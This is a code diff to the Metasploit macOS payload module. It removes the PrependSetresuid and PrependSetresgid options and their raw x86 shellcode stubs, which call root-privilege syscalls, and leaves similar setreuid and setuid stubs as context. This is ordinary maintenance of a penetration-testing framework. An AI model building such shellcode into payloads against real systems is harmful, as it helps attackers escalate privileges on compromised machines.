@@ -19,13 +19,6 @@ module Msf::Payload::Osx
 
     register_advanced_options(
       [
-        Msf::OptBool.new('PrependSetresuid',
-          [
-            false,
-            "Prepend a stub that executes the setresuid(0, 0, 0) system call",
-            false
-          ]
-        ),
         Msf::OptBool.new('PrependSetreuid',
           [
             false,
@@ -37,13 +30,6 @@ module Msf::Payload::Osx
           [
             false,
             "Prepend a stub that executes the setuid(0) system call",
-            false
-          ]
-        ),
-        Msf::OptBool.new('PrependSetresgid',
-          [
-            false,
-            "Prepend a stub that executes the setresgid(0, 0, 0) system call",
             false
           ]
         ),
@@ -89,16 +75,6 @@ module Msf::Payload::Osx
   end
 
   def handle_x86_osx_opts(pre, app)
-    if (datastore['PrependSetresuid'])
-      # setresuid(0, 0, 0)
-      pre << "\x31\xc0"             +#   xorl    %eax,%eax                  #
-             "\x50"                 +#   pushl   %eax                       #
-             "\x50"                 +#   pushl   %eax                       #
-             "\x50"                 +#   pushl   %eax                       #
-             "\x50"                 +#   pushl   %eax                       #
-             "\x66\xb8\x37\x01"     +#   movw    $0x0137,%ax                #
-             "\xcd\x80"              #   int     $0x80                      #
-    end
 
     if (datastore['PrependSetreuid'])
       # setreuid(0, 0)
@@ -116,17 +92,6 @@ module Msf::Payload::Osx
              "\x50"                 +#   pushl   %eax                       #
              "\x50"                 +#   pushl   %eax                       #
              "\xb0\x17"             +#   movb    $0x17,%al                  #
-             "\xcd\x80"              #   int     $0x80                      #
-    end
-
-    if (datastore['PrependSetresgid'])
-      # setresgid(0, 0, 0)
-      pre << "\x31\xc0"             +#   xorl    %eax,%eax                  #
-             "\x50"                 +#   pushl   %eax                       #
-             "\x50"                 +#   pushl   %eax                       #
-             "\x50"                 +#   pushl   %eax                       #
-             "\x50"                 +#   pushl   %eax                       #
-             "\x66\xb8\x38\x01"     +#   movw    $0x0138,%ax                #
              "\xcd\x80"              #   int     $0x80                      #
     end
 
@@ -159,10 +124,6 @@ module Msf::Payload::Osx
   end
 
   def handle_x64_osx_opts(pre, app)
-    if (datastore['PrependSetresuid'])
-      # setresuid(0, 0, 0)
-      raise RuntimeError, "setresuid syscall is not implemented on x64 OSX systems"
-    end
 
     if (datastore['PrependSetreuid'])
       # setreuid(0, 0)
@@ -183,11 +144,6 @@ module Msf::Payload::Osx
              "\x4c\x89\xc0"         +# mov rax, r8
              "\x48\x31\xff"         +# xor rdi, rdi  0
              "\x0f\x05"             # syscall
-    end
-
-    if (datastore['PrependSetresgid'])
-      # setresgid(0, 0, 0)
-      raise RuntimeError, "setresgid syscall is not implemented on x64 OSX systems"
     end
 
     if (datastore['PrependSetregid'])
